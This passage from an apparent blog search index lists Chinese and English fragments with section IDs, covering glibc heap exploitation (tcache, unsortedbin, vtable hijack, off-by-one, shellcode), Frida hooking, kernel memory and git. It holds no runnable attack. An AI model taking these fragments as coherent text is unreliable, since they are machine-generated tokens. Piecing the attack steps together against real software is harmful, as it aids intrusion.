141\":1}}],[\"列表\",{\"1\":{\"134\":1}}],[\"标识各page是否已分配的bitmap数组\",{\"1\":{\"438\":1}}],[\"标准输入\",{\"1\":{\"258\":1}}],[\"标签\",{\"1\":{\"141\":1}}],[\"标记指针\",{\"0\":{\"82\":1,\"222\":1}}],[\"应在代码中多使用抽象接口\",{\"1\":{\"252\":1}}],[\"应用程序的名称和图标\",{\"1\":{\"141\":1}}],[\"应该是根据指针\",{\"1\":{\"324\":1}}],[\"应该是class\",{\"1\":{\"134\":1}}],[\"应该就是检查下一个chunk是否是合法的\",{\"1\":{\"312\":1}}],[\"应该避免在代码中写入与任何具体实现相关的名字\",{\"1\":{\"252\":1}}],[\"应该\",{\"1\":{\"127\":1}}],[\"主线程对应主分配区\",{\"1\":{\"351\":1}}],[\"主分配区在ptmalloc\",{\"1\":{\"353\":1}}],[\"主分配区放头部\",{\"1\":{\"347\":2}}],[\"主分配区和非主分配区用next形成一个环形链表进行管理\",{\"1\":{\"347\":1}}],[\"主分配区和非主分配区arena的实现\",{\"1\":{\"346\":1}}],[\"主分配区\",{\"0\":{\"347\":1}}],[\"主分支\",{\"0\":{\"268\":1}}],[\"主力pwn环境\",{\"0\":{\"259\":1}}],[\"主题\",{\"1\":{\"141\":1}}],[\"主标签\",{\"0\":{\"141\":1}}],[\"主要就是判断打开模式\",{\"1\":{\"420\":1}}],[\"主要运用在\",{\"1\":{\"345\":1}}],[\"主要通过yield关键字来实现切换控制权\",{\"1\":{\"281\":1}}],[\"主要项目负责人\",{\"0\":{\"110\":1}}],[\"主要负责对内存区域的大致划分结构体属性存储的就是各个内存区域的边界\",{\"1\":{\"76\":1,\"216\":1}}],[\"主要分为两种\",{\"1\":{\"73\":1,\"213\":1}}],[\"主要是构造合法的size\",{\"1\":{\"365\":1}}],[\"主要是看ntustisc\",{\"1\":{\"341\":1}}],[\"主要是看着wiki\",{\"1\":{\"304\":1}}],[\"主要是glibc在高版本下的安全检查机制\",{\"1\":{\"303\":1}}],[\"主要是包含了一些属性\",{\"1\":{\"143\":1}}],[\"主要是说明一些逆向的时候我们需要看的信息\",{\"1\":{\"139\":1}}],[\"主要是一些权限信息之类的\",{\"1\":{\"78\":1,\"218\":1}}],[\"主要是想办法调用\",{\"1\":{\"60\":1,\"200\":1}}],[\"主要是利用了unsoretdbin\",{\"1\":{\"57\":1,\"197\":1}}],[\"主要是我们能溢出数据到topchunk的size区域\",{\"1\":{\"56\":1,\"196\":1}}],[\"主要是总结一些利用难度较高\",{\"1\":{\"53\":1,\"193\":1}}],[\"主要是数据段\",{\"1\":{\"16\":1,\"158\":1}}],[\"天涯海角路\",{\"1\":{\"140\":1,\"143\":1}}],[\"哈哈哈哈\",{\"1\":{\"134\":1}}],[\"出现在函数内部\",{\"1\":{\"281\":1}}],[\"出现了报错\",{\"1\":{\"134\":1}}],[\"出来\",{\"1\":{\"110\":1}}],[\"使用此选项后\",{\"1\":{\"464\":1}}],[\"使用解析后的地址跳转执行目标函数\",{\"1\":{\"449\":1}}],[\"使用git\",{\"0\":{\"273\":1,\"275\":1}}],[\"使用以及理解\",{\"1\":{\"272\":1}}],[\"使用的http协议进行初始握手\",{\"1\":{\"253\":1}}],[\"使用\",{\"1\":{\"253\":1}}],[\"使用rsactftool\",{\"1\":{\"243\":1}}],[\"使用指令\",{\"1\":{\"134\":1}}],[\"使用详解\",{\"1\":{\"132\":1}}],[\"使用java平台\",{\"1\":{\"120\":1,\"121\":1}}],[\"使用java的平台\",{\"0\":{\"120\":1}}],[\"留着后天来写\",{\"1\":{\"131\":1}}],[\"接下来我们需要理解\",{\"1\":{\"446\":1}}],[\"接下来我们需要筛选\",{\"1\":{\"131\":1}}],[\"接下来的代码都是从largebin中获取chunk\",{\"1\":{\"321\":1}}],[\"接口隔离\",{\"1\":{\"252\":2}}],[\"接口d和e规定了我们需要b和c的哪些函数\",{\"1\":{\"245\":1}}],[\"接口实现\",{\"0\":{\"26\":1,\"168\":1}}],[\"执行exec\",{\"1\":{\"454\":1}}],[\"执行\",{\"1\":{\"423\":1}}],[\"执行后new\",{\"1\":{\"411\":1}}],[\"执行largebin的入chunk\",{\"1\":{\"319\":1}}],[\"执行指令objection\",{\"1\":{\"133\":1}}],[\"执行成功\",{\"1\":{\"131\":1}}],[\"执行完上面的hook指令后发现了报错\",{\"1\":{\"131\":1}}],[\"只要写满了\",{\"1\":{\"480\":1}}],[\"只要其钥匙的长度足够长\",{\"1\":{\"238\":1}}],[\"只能向下翻页\",{\"1\":{\"464\":1}}],[\"只有主chunk会用到\",{\"1\":{\"438\":1}}],[\"只有当进程实际访问内存资源的时候才会建立虚拟地址和物理地址的映射\",{\"1\":{\"16\":1,\"158\":1}}],[\"只有当进程尝试写入共享区域的某个页面的时候\",{\"1\":{\"16\":1,\"158\":1}}],[\"只有当引用计数变为0时\",{\"1\":{\"4\":1,\"147\":1}}],[\"只是大概知道有这么一个东西\",{\"1\":{\"432\":1}}],[\"只是为了学习\",{\"1\":{\"128\":1}}],[\"只不过指针所指向的地址得是个常量\",{\"1\":{\"399\":1}}],[\"只不过需要绕过一下新版本中对vtable地址的检测\",{\"1\":{\"393\":1}}],[\"只不过我们还是得调整一下要选择合并的chunk的位置\",{\"1\":{\"368\":1}}],[\"只需要\",{\"1\":{\"358\":1,\"359\":1}}],[\"只需要把函数调用\",{\"1\":{\"282\":1}}],[\"循环输出所有方法\",{\"1\":{\"126\":1}}],[\"循环hook所有重载方法\",{\"1\":{\"123\":1}}],[\"根据\",{\"1\":{\"388\":1}}],[\"根据地址我们知道\",{\"1\":{\"368\":1}}],[\"根据注释大概知道是进行完整的插入操作\",{\"1\":{\"321\":1}}],[\"根据密钥的使用方法\",{\"1\":{\"238\":1}}],[\"根据文章在android\",{\"1\":{\"142\":1}}],[\"根据类名获取java类\",{\"1\":{\"126\":1}}],[\"根据总结来进行学习\",{\"1\":{\"5\":1,\"148\":1}}],[\"枚举方法同上\",{\"1\":{\"126\":1}}],[\"枚举完成以后调用\",{\"1\":{\"126\":1}}],[\"枚举已经加载的类\",{\"1\":{\"126\":2}}],[\"枚举所有的类和方法\",{\"0\":{\"126\":1}}],[\"每次去使用xclibc的时候\",{\"1\":{\"452\":1}}],[\"每次去看别人文章分析总结的\",{\"1\":{\"308\":1}}],[\"每次emalloc下来的small\",{\"1\":{\"440\":1}}],[\"每次请求结束后会根据peak\",{\"1\":{\"438\":1}}],[\"每条链上最多可以有7个chunk\",{\"1\":{\"285\":1}}],[\"每枚举一个类调用一次\",{\"1\":{\"126\":1}}],[\"每遍历一个对象都会调用onmatch\",{\"1\":{\"125\":1}}],[\"每个page占一个bit位\",{\"1\":{\"438\":1}}],[\"每个线程都会设置这么一个变量thread\",{\"1\":{\"351\":1}}],[\"每个bin之间相差8个字节\",{\"1\":{\"347\":1}}],[\"每个最多存7个chunk\",{\"1\":{\"338\":1}}],[\"每个tcache最多收取7个chunk\",{\"1\":{\"338\":1}}],[\"每个libc版本的区别\",{\"1\":{\"308\":1}}],[\"每个提交应该包含一个简明扼要的提交信息\",{\"1\":{\"263\":1}}],[\"每个提交应该只包含一个逻辑上的更改或修复\",{\"1\":{\"263\":1}}],[\"每个进程的\",{\"1\":{\"69\":1,\"209\":1}}],[\"每个chunk占2m\",{\"1\":{\"50\":1,\"190\":1}}],[\"$fruit\",{\"1\":{\"467\":1}}],[\"$line\",{\"1\":{\"467\":1}}],[\"$$`\",{\"1\":{\"463\":1}}],[\"$$\",{\"1\":{\"463\":1}}],[\"$\",{\"1\":{\"445\":1,\"463\":12}}],[\"$2\",{\"1\":{\"408\":1}}],[\"$new\",{\"1\":{\"124\":1}}],[\"$init\",{\"1\":{\"124\":2}}],[\"稍微举列子\",{\"1\":{\"124\":1}}],[\"粗鄙理解\",{\"1\":{\"124\":1}}],[\"打开文件\",{\"0\":{\"418\":1},\"1\":{\"403\":2}}],[\"打开的文件等\",{\"1\":{\"66\":1,\"206\":1}}],[\"打印参数个数\",{\"1\":{\"123\":1}}],[\"上一个chunk的大小否则\",{\"1\":{\"329\":1}}],[\"上一个chunk处于free状态的时候来表示\",{\"1\":{\"329\":1}}],[\"上述一共提及了几个字母\",{\"1\":{\"241\":1}}],[\"上面举的列子\",{\"1\":{\"122\":1}}],[\"上篇学习了git的规范\",{\"1\":{\"105\":1}}],[\"<<\",{\"1\":{\"503\":1}}],[\"<main+62>\",{\"1\":{\"470\":1}}],[\"<method>\",{\"1\":{\"121\":1,\"122\":2}}],[\"<pthread\",{\"1\":{\"458\":1}}],[\"<repeats\",{\"1\":{\"408\":1}}],[\"<string\",{\"1\":{\"397\":1,\"404\":1}}],[\"<stdio\",{\"1\":{\"290\":1,\"404\":1,\"462\":1}}],[\"<=\",{\"1\":{\"312\":1,\"324\":4,\"339\":2,\"352\":1,\"426\":2,\"459\":2,\"461\":1,\"503\":1}}],[\"<=>\",{\"1\":{\"296\":6}}],[\"<\",{\"1\":{\"131\":1,\"240\":1,\"290\":2,\"310\":1,\"312\":1,\"315\":1,\"319\":2,\"321\":2,\"324\":3,\"342\":2,\"411\":1,\"462\":1,\"463\":1,\"470\":1}}],[\"<function>\",{\"1\":{\"123\":1}}],[\"<class>\",{\"1\":{\"123\":1}}],[\"<wrapper>\",{\"1\":{\"121\":1,\"122\":1}}],[\"去完成绑定\",{\"1\":{\"449\":1}}],[\"去打开文件\",{\"1\":{\"420\":1}}],[\"去large\",{\"1\":{\"330\":1}}],[\"去除unsortedbin头指针\",{\"1\":{\"324\":1}}],[\"去除尾链的fd和头链的bk方便我们理清逻辑\",{\"1\":{\"308\":1}}],[\"去除了头部的fd\",{\"1\":{\"308\":1}}],[\"去添加新的功能应该是利用继承重写等机制进行添加新的功能而不是直接对原本的代码进行修改\",{\"1\":{\"252\":1}}],[\"去找到androidmainfest\",{\"1\":{\"130\":1}}],[\"去找中断描述符表\",{\"1\":{\"21\":1,\"163\":1}}],[\"去hook脚本\",{\"1\":{\"118\":1}}],[\"附着脚本\",{\"0\":{\"118\":1}}],[\"映射端口\",{\"0\":{\"114\":1}}],[\"开一块内存出来执行shellcode即可\",{\"1\":{\"504\":1}}],[\"开始构造double\",{\"1\":{\"491\":1}}],[\"开始构造一个chunk处于fastbin中情况\",{\"1\":{\"488\":1}}],[\"开始泄露\",{\"1\":{\"475\":1}}],[\"开放封闭\",{\"1\":{\"252\":2}}],[\"开发迅速便于理解\",{\"1\":{\"252\":1}}],[\"开发框架\",{\"0\":{\"97\":1}}],[\"开源协议\",{\"0\":{\"112\":1}}],[\"写上我们想要覆盖的数据\",{\"1\":{\"388\":1}}],[\"写上\",{\"1\":{\"388\":1}}],[\"写入chunk的时候多写了一位0\",{\"1\":{\"487\":1}}],[\"写入one\",{\"1\":{\"476\":1}}],[\"写入数据覆盖到chunk\",{\"1\":{\"368\":1}}],[\"写入刚好size大小的数据\",{\"1\":{\"302\":1}}],[\"写一个计算chunk大小的程序\",{\"0\":{\"288\":1}}],[\"写得很好\",{\"1\":{\"275\":1}}],[\"写数据操作的缓存池\",{\"1\":{\"254\":1}}],[\"写明如何想要进入我们的项目\",{\"1\":{\"111\":1}}],[\"写时复制\",{\"1\":{\"8\":1,\"150\":1}}],[\"写时复制技术详解\",{\"1\":{\"8\":1,\"150\":1}}],[\"安全资讯平台\",{\"1\":{\"372\":1,\"494\":1}}],[\"安全客\",{\"1\":{\"372\":1,\"494\":1}}],[\"安全检查\",{\"1\":{\"321\":3}}],[\"安全检查机制\",{\"0\":{\"312\":1,\"362\":1}}],[\"安全性\",{\"0\":{\"241\":1}}],[\"安全社区|安全招聘|kanxue\",{\"1\":{\"46\":1,\"132\":1,\"186\":1,\"256\":1,\"372\":1,\"382\":1,\"393\":1,\"397\":1,\"494\":1}}],[\"安装和使用\",{\"0\":{\"108\":1}}],[\"介绍为什么要做这个项目\",{\"1\":{\"107\":1}}],[\"必备的信息\",{\"0\":{\"106\":1}}],[\"必须是显式释放\",{\"1\":{\"82\":1,\"222\":1}}],[\"日志框架\",{\"0\":{\"104\":1}}],[\"新建标签页\",{\"1\":{\"483\":1}}],[\"新的fake\",{\"1\":{\"446\":1}}],[\"新申请的分配区都会放入主分配区的下一个位置\",{\"1\":{\"353\":1}}],[\"新加入的分配区放main\",{\"1\":{\"347\":2}}],[\"新增特性\",{\"1\":{\"265\":1}}],[\"新手入门必备\",{\"1\":{\"256\":1}}],[\"新\",{\"1\":{\"103\":1}}],[\"零copy技术\",{\"1\":{\"99\":1}}],[\"二元运算抽象语法树\",{\"0\":{\"93\":1,\"233\":1}}],[\"代码过于复杂\",{\"1\":{\"400\":1}}],[\"代码\",{\"1\":{\"286\":1,\"365\":1,\"366\":1,\"367\":1,\"368\":1}}],[\"代码风格的调整\",{\"1\":{\"265\":1}}],[\"代码实现\",{\"0\":{\"242\":1}}],[\"代码生成\",{\"1\":{\"87\":1,\"227\":1}}],[\"代码段共享\",{\"1\":{\"16\":1,\"158\":1}}],[\"生成器对象\",{\"1\":{\"281\":1}}],[\"生成中间代码\",{\"1\":{\"87\":1,\"227\":1}}],[\"生成汇编语言\",{\"1\":{\"87\":1,\"227\":1}}],[\"语言创建\",{\"1\":{\"253\":1}}],[\"语言天生就符合这一点\",{\"1\":{\"252\":1}}],[\"语法解析\",{\"0\":{\"88\":1,\"228\":1}}],[\"语法分析\",{\"1\":{\"87\":1,\"227\":1}}],[\"语义分析\",{\"1\":{\"87\":1,\"227\":1}}],[\"预处理\",{\"1\":{\"87\":1,\"227\":1}}],[\"预计中旬左右\",{\"1\":{\"2\":1,\"145\":1}}],[\"编译\",{\"1\":{\"87\":1,\"227\":1}}],[\"编译器主要是四个阶段\",{\"1\":{\"87\":1,\"227\":1}}],[\"编译原理\",{\"0\":{\"87\":1,\"227\":1}}],[\"编译整体流程\",{\"0\":{\"85\":1,\"225\":1}}],[\"压缩指针\",{\"0\":{\"83\":1,\"223\":1}}],[\"下面的解释其实有失偏颇\",{\"1\":{\"368\":1}}],[\"下面是其接口\",{\"1\":{\"280\":1}}],[\"下方是malloc一个新的分区的情况\",{\"1\":{\"349\":1}}],[\"下标1是unsorted\",{\"1\":{\"347\":1}}],[\"下一个free\",{\"1\":{\"338\":1}}],[\"下一个chunk也是free\",{\"1\":{\"324\":1}}],[\"下常规overlapping失败的原因\",{\"0\":{\"299\":1}}],[\"下载python\",{\"1\":{\"262\":1}}],[\"下次垃圾回收就有可能被回收\",{\"1\":{\"82\":1,\"222\":1}}],[\"下的文件描述符\",{\"1\":{\"15\":1,\"157\":1}}],[\"弱引用\",{\"1\":{\"82\":1,\"222\":1}}],[\"强引用也即是垃圾回收器不会去回收这个对象\",{\"1\":{\"82\":1,\"222\":1}}],[\"脏管道学习\",{\"0\":{\"80\":1,\"220\":1}}],[\"脏页\",{\"1\":{\"68\":1,\"208\":1}}],[\"攻击手段就是利用在调用对ptmx驱动进行write操作的时候我们是利用的tty\",{\"1\":{\"79\":1,\"219\":1}}],[\"等效为\",{\"1\":{\"296\":1,\"483\":1}}],[\"等\",{\"1\":{\"77\":1,\"217\":1}}],[\"等信息\",{\"1\":{\"77\":1,\"217\":1,\"373\":1,\"495\":1}}],[\"等待下一步操作\",{\"1\":{\"13\":1,\"155\":1}}],[\"权限等等\",{\"1\":{\"141\":1}}],[\"权限\",{\"1\":{\"77\":1,\"217\":1}}],[\"双向链表\",{\"0\":{\"77\":1,\"217\":1}}],[\"允许查看printk函数输出\",{\"1\":{\"74\":1,\"214\":1}}],[\"允许查看内核函数地址\",{\"1\":{\"74\":1,\"214\":1}}],[\"管理模式访问保护\",{\"1\":{\"74\":1,\"214\":1}}],[\"管理模式执行保护\",{\"1\":{\"74\":1,\"214\":1}}],[\"管道必须写入后\",{\"1\":{\"13\":1,\"155\":1}}],[\"管道中最重要的2个方法就是管道的读写\",{\"1\":{\"13\":1,\"155\":1}}],[\"管道\",{\"0\":{\"13\":1,\"155\":1},\"1\":{\"13\":1,\"155\":1}}],[\"初始化\",{\"0\":{\"409\":1},\"1\":{\"403\":2,\"410\":1}}],[\"初始化分配区锁\",{\"1\":{\"353\":1}}],[\"初始化mstate\",{\"1\":{\"353\":1}}],[\"初始化一个新的分配区arena\",{\"1\":{\"353\":1}}],[\"初步探索\",{\"0\":{\"134\":1}}],[\"初次体验\",{\"0\":{\"132\":1}}],[\"初探\",{\"1\":{\"73\":1,\"74\":1,\"213\":1,\"214\":1}}],[\"初入职场必备丨二进制面试问题汇总\",{\"1\":{\"2\":1,\"145\":1}}],[\"qword\",{\"1\":{\"292\":1}}],[\"qq\",{\"1\":{\"273\":1}}],[\"q然后根据e\",{\"1\":{\"243\":1}}],[\"q\",{\"1\":{\"240\":1,\"241\":2,\"243\":3,\"464\":2}}],[\"q和z=\",{\"1\":{\"240\":1}}],[\"quiet\",{\"1\":{\"464\":1}}],[\"quickly\",{\"1\":{\"324\":1}}],[\"quit\",{\"1\":{\"131\":1,\"464\":2}}],[\"queue\",{\"1\":{\"43\":2,\"183\":2}}],[\"qemu\",{\"1\":{\"73\":1,\"213\":1,\"485\":3}}],[\"申请回来\",{\"1\":{\"373\":1,\"495\":1}}],[\"申请小的内存空间\",{\"1\":{\"327\":1}}],[\"申请\",{\"1\":{\"71\":1,\"211\":1,\"330\":1}}],[\"申请内存\",{\"1\":{\"330\":1}}],[\"申请内存<64bytes\",{\"1\":{\"330\":1}}],[\"申请内存的过程\",{\"0\":{\"330\":1}}],[\"申请内存时直接在对应page上查找可用位置\",{\"1\":{\"50\":1,\"190\":1}}],[\"申请内存小于等于3092b\",{\"1\":{\"50\":1,\"190\":1}}],[\"申请内存大于3092b\",{\"1\":{\"50\":1,\"190\":1}}],[\"申请内存大于2m\",{\"1\":{\"50\":1,\"190\":1}}],[\"伙伴算法\",{\"1\":{\"70\":1,\"210\":1}}],[\"图片\",{\"1\":{\"70\":1,\"76\":1,\"77\":1,\"210\":1,\"216\":1,\"217\":1}}],[\"临时映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"固定映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"固定内存映射区\",{\"1\":{\"16\":1,\"158\":1}}],[\"永久映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"永久内存映射区\",{\"1\":{\"16\":1,\"158\":1}}],[\"区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"采用的是动态映射技术\",{\"1\":{\"70\":1,\"210\":1}}],[\"759\",{\"1\":{\"503\":1}}],[\"758\",{\"1\":{\"380\":1,\"502\":1}}],[\"719\",{\"1\":{\"503\":1}}],[\"7856\",{\"1\":{\"503\":1}}],[\"782\",{\"1\":{\"261\":1}}],[\"7是占用状态\",{\"1\":{\"488\":1}}],[\"7$d\",{\"1\":{\"479\":1}}],[\"7$ld\",{\"1\":{\"478\":1,\"479\":1}}],[\"720\",{\"1\":{\"488\":1}}],[\"721\",{\"1\":{\"488\":1}}],[\"72548352\",{\"1\":{\"411\":1}}],[\"72997379cf7b47e3ba92e51a413d2529\",{\"1\":{\"255\":1}}],[\"760\",{\"1\":{\"376\":1,\"498\":1}}],[\"7692\",{\"1\":{\"254\":1}}],[\"7c0\",{\"1\":{\"365\":1,\"369\":1}}],[\"7个chunk\",{\"1\":{\"302\":1}}],[\"7\",{\"1\":{\"262\":1,\"365\":1,\"369\":1,\"376\":1,\"378\":2,\"380\":3,\"397\":1,\"404\":1,\"437\":1,\"461\":1,\"464\":1,\"475\":5,\"481\":1,\"488\":5,\"491\":2,\"498\":1,\"500\":2,\"502\":3,\"503\":14,\"504\":1}}],[\"77\",{\"1\":{\"258\":1}}],[\"7fff\",{\"1\":{\"70\":1,\"210\":1}}],[\"7地址\",{\"1\":{\"12\":1,\"154\":1}}],[\"存储\",{\"1\":{\"451\":1}}],[\"存储的是指针\",{\"1\":{\"399\":1}}],[\"存储的是push\",{\"1\":{\"36\":1,\"176\":1}}],[\"存储的是plt\",{\"1\":{\"36\":1,\"176\":1}}],[\"存入fake\",{\"1\":{\"446\":1}}],[\"存在栈的off\",{\"1\":{\"480\":1}}],[\"存在泄露\",{\"1\":{\"371\":1,\"493\":1}}],[\"存在于tls\",{\"1\":{\"338\":1}}],[\"存在off\",{\"1\":{\"301\":1}}],[\"存在原因是因为64位用高16位作为标记\",{\"1\":{\"70\":1,\"210\":1}}],[\"存一个int\",{\"1\":{\"292\":1}}],[\"存一个结构体指针\",{\"1\":{\"292\":1}}],[\"存name\",{\"1\":{\"292\":1}}],[\"存content\",{\"1\":{\"292\":1}}],[\"存\",{\"1\":{\"292\":1}}],[\"存size\",{\"1\":{\"292\":1}}],[\"存使用情况\",{\"1\":{\"292\":2}}],[\"存放进程信息\",{\"1\":{\"78\":1,\"218\":1}}],[\"之间的任意一个数值\",{\"1\":{\"69\":1,\"209\":1}}],[\"到现在我们就可以理清楚了核心需要实现的部分\",{\"1\":{\"446\":1}}],[\"到2008年为止\",{\"1\":{\"238\":1}}],[\"到\",{\"1\":{\"69\":1,\"209\":1}}],[\"校准值\",{\"1\":{\"69\":1,\"209\":1}}],[\"杀掉呢\",{\"0\":{\"69\":1,\"209\":1}}],[\"匿名页\",{\"1\":{\"68\":1,\"208\":1}}],[\"回收内存\",{\"1\":{\"68\":1,\"208\":1}}],[\"后缀改为\",{\"1\":{\"463\":1}}],[\"后new\",{\"1\":{\"408\":1}}],[\"后续的malloc失效\",{\"1\":{\"378\":1,\"500\":1}}],[\"后面的参数就是栈地址了\",{\"1\":{\"476\":1}}],[\"后面的操作中最重要的就是victim变量\",{\"1\":{\"310\":1}}],[\"后面细讲\",{\"1\":{\"372\":1,\"494\":1}}],[\"后面会详细说明\",{\"1\":{\"365\":1}}],[\"后面详细说一下我们的利用流程\",{\"1\":{\"363\":1}}],[\"后面禁止了\",{\"1\":{\"9\":1,\"151\":1}}],[\"后一个chunk的指针\",{\"1\":{\"295\":1}}],[\"后args会变成yield的返回值\",{\"1\":{\"281\":1}}],[\"后台运行\",{\"1\":{\"258\":1}}],[\"后依旧不够就会杀死一个物理内存占用较高的进程\",{\"1\":{\"68\":1,\"208\":1}}],[\"包括文件的百分比位置等\",{\"1\":{\"464\":1}}],[\"包括内存\",{\"1\":{\"66\":1,\"206\":1}}],[\"包名\",{\"1\":{\"141\":1}}],[\"包含空格\",{\"1\":{\"466\":1}}],[\"包含512\",{\"1\":{\"438\":1}}],[\"包含了属性\",{\"1\":{\"252\":1}}],[\"包含了程序文件自己本身的名字\",{\"1\":{\"37\":1,\"177\":1}}],[\"包含四大组件的标签\",{\"1\":{\"141\":1}}],[\"包含全局属性\",{\"1\":{\"141\":1}}],[\"包含\",{\"1\":{\"141\":1}}],[\"包含程序名称\",{\"1\":{\"37\":1,\"177\":1}}],[\"包含filenode等信息就可以找到文件本体了\",{\"1\":{\"15\":1,\"157\":1}}],[\"线程库\",{\"1\":{\"458\":1}}],[\"线程中malloc\",{\"1\":{\"349\":1}}],[\"线程是\",{\"1\":{\"66\":1,\"206\":1}}],[\"线程基础知识\",{\"1\":{\"66\":1,\"206\":1}}],[\"线性空间连续\",{\"1\":{\"16\":1,\"158\":1}}],[\"段选择子再去\",{\"1\":{\"64\":1,\"204\":1}}],[\"段保护模式\",{\"0\":{\"63\":1,\"203\":1}}],[\">0x14514000\",{\"1\":{\"483\":1}}],[\">劫持程序流程\",{\"1\":{\"446\":1}}],[\">栈迁移\",{\"1\":{\"446\":1}}],[\">peak\",{\"1\":{\"439\":2,\"441\":2}}],[\">prev\",{\"1\":{\"312\":2,\"345\":1}}],[\">wd\",{\"1\":{\"403\":1,\"410\":1}}],[\">lock\",{\"1\":{\"403\":1}}],[\">last\",{\"1\":{\"313\":2}}],[\">vtable\",{\"1\":{\"397\":1}}],[\">overflow\",{\"1\":{\"388\":1}}],[\">old\",{\"1\":{\"324\":1}}],[\">>12\",{\"1\":{\"503\":1}}],[\">>>\",{\"1\":{\"380\":1,\"475\":1,\"488\":1,\"491\":4,\"502\":1,\"503\":6}}],[\">>\",{\"1\":{\"369\":1,\"503\":1}}],[\">max\",{\"1\":{\"353\":1}}],[\">mutex\",{\"1\":{\"324\":4,\"339\":2,\"349\":1,\"351\":3,\"353\":2}}],[\">next\",{\"1\":{\"342\":1,\"349\":2,\"353\":5,\"439\":2,\"441\":1,\"442\":1}}],[\">entries\",{\"1\":{\"342\":1}}],[\">key\",{\"1\":{\"342\":1}}],[\">stderr\",{\"1\":{\"403\":2}}],[\">size\",{\"1\":{\"339\":2,\"345\":1,\"353\":2,\"439\":4,\"441\":2,\"442\":2}}],[\">system\",{\"1\":{\"312\":3,\"324\":3,\"339\":3,\"353\":1}}],[\">attached\",{\"1\":{\"353\":2}}],[\">addr\",{\"1\":{\"339\":1}}],[\">ar\",{\"1\":{\"324\":1,\"353\":2}}],[\">64bytes\",{\"1\":{\"330\":1}}],[\">have\",{\"1\":{\"324\":2}}],[\">top\",{\"1\":{\"324\":7}}],[\">=\",{\"1\":{\"321\":1,\"324\":6,\"339\":2,\"352\":1,\"410\":1,\"428\":1,\"462\":1}}],[\">free\",{\"1\":{\"439\":5,\"441\":3,\"442\":2}}],[\">file\",{\"1\":{\"417\":6}}],[\">fp\",{\"1\":{\"403\":7,\"410\":1,\"413\":1,\"416\":1,\"417\":1,\"419\":1}}],[\">func\",{\"1\":{\"394\":1,\"395\":1}}],[\">fwd\",{\"1\":{\"319\":1}}],[\">fd成功\",{\"1\":{\"369\":1}}],[\">fd都是p\",{\"1\":{\"345\":1}}],[\">fd等于bk\",{\"1\":{\"344\":1}}],[\">fd是否等于p\",{\"1\":{\"344\":1}}],[\">fd被赋值victim\",{\"1\":{\"325\":1}}],[\">fd也就是目标地址\",{\"1\":{\"325\":1}}],[\">fd置为\",{\"1\":{\"296\":1}}],[\">fd\",{\"0\":{\"367\":1},\"1\":{\"296\":14,\"305\":2,\"312\":2,\"313\":3,\"314\":1,\"317\":2,\"318\":2,\"319\":14,\"321\":6,\"324\":7,\"325\":11,\"339\":2,\"344\":17,\"345\":4,\"365\":1,\"378\":2,\"500\":2}}],[\">cs位0x23\",{\"1\":{\"483\":1}}],[\">chunk2\",{\"1\":{\"339\":5}}],[\">chunk1的死循环\",{\"1\":{\"339\":1}}],[\">chunk1\",{\"1\":{\"339\":5}}],[\">chunk<\",{\"1\":{\"319\":1}}],[\">counts\",{\"1\":{\"315\":1,\"324\":1,\"342\":1}}],[\">bk成功\",{\"1\":{\"369\":1}}],[\">bk那样直接free\",{\"1\":{\"367\":1}}],[\">bk也就是fd+0x18的位置为p\",{\"1\":{\"345\":1}}],[\">bk等于fd\",{\"1\":{\"344\":1}}],[\">bk和bk\",{\"1\":{\"344\":1,\"345\":1}}],[\">bk应该就是最后一位\",{\"1\":{\"319\":1}}],[\">bk来进行的定位\",{\"1\":{\"316\":1}}],[\">bk与\",{\"1\":{\"296\":1}}],[\">bk设置为\",{\"1\":{\"296\":1}}],[\">bk\",{\"0\":{\"366\":1},\"1\":{\"296\":13,\"305\":2,\"306\":1,\"310\":2,\"312\":2,\"313\":3,\"314\":1,\"317\":2,\"319\":15,\"321\":6,\"324\":4,\"325\":16,\"344\":14,\"345\":4,\"365\":1}}],[\">1\",{\"1\":{\"241\":1}}],[\">2\",{\"1\":{\"241\":1}}],[\">一般我们要改成true\",{\"1\":{\"141\":1}}],[\">java\",{\"1\":{\"120\":1}}],[\">\",{\"1\":{\"73\":1,\"131\":5,\"213\":1,\"310\":1,\"312\":2,\"313\":1,\"324\":1,\"350\":2,\"352\":1,\"353\":1,\"388\":1,\"395\":2,\"397\":13,\"410\":28,\"426\":22,\"446\":1,\"460\":1}}],[\">物理地址\",{\"1\":{\"63\":1,\"203\":1}}],[\">线性地址\",{\"1\":{\"63\":1,\"203\":1}}],[\"页保护模式\",{\"0\":{\"63\":1,\"203\":1}}],[\"`com\",{\"1\":{\"131\":1}}],[\"`\",{\"1\":{\"60\":1,\"200\":1,\"463\":9}}],[\"v4\",{\"1\":{\"470\":4}}],[\"v2\",{\"1\":{\"469\":3}}],[\"v\",{\"1\":{\"464\":1}}],[\"v9\",{\"1\":{\"459\":3}}],[\"v7\",{\"1\":{\"459\":2}}],[\"vtables部分内\",{\"1\":{\"428\":1}}],[\"vtables\",{\"1\":{\"428\":5}}],[\"vtable和\",{\"1\":{\"427\":1}}],[\"vtable表赋值\",{\"0\":{\"412\":1}}],[\"vtable指向的是类型为\",{\"1\":{\"399\":1}}],[\"vtable改为\",{\"1\":{\"395\":1}}],[\"vtable\",{\"0\":{\"401\":1,\"428\":1},\"1\":{\"388\":1,\"390\":1,\"394\":2,\"395\":4,\"396\":1,\"397\":5,\"399\":1,\"404\":4,\"408\":4,\"410\":1,\"411\":2,\"426\":2,\"427\":1,\"428\":7}}],[\"vuln\",{\"1\":{\"358\":2,\"359\":2,\"369\":2,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"verbose\",{\"1\":{\"464\":1}}],[\"version\",{\"1\":{\"455\":1}}],[\"very\",{\"1\":{\"352\":1}}],[\"verify\",{\"1\":{\"342\":1}}],[\"ve\",{\"1\":{\"342\":1}}],[\"vim命令\",{\"1\":{\"464\":1}}],[\"vi\",{\"1\":{\"464\":1}}],[\"via\",{\"1\":{\"324\":2,\"353\":1}}],[\"victim所以等价替换\",{\"1\":{\"325\":1}}],[\"victim为last\",{\"1\":{\"313\":1}}],[\"victim\",{\"1\":{\"305\":7,\"306\":2,\"310\":4,\"312\":6,\"313\":5,\"315\":4,\"317\":5,\"318\":3,\"319\":16,\"321\":17,\"322\":2,\"325\":12}}],[\"view函数\",{\"1\":{\"371\":1,\"493\":1}}],[\"view\",{\"0\":{\"248\":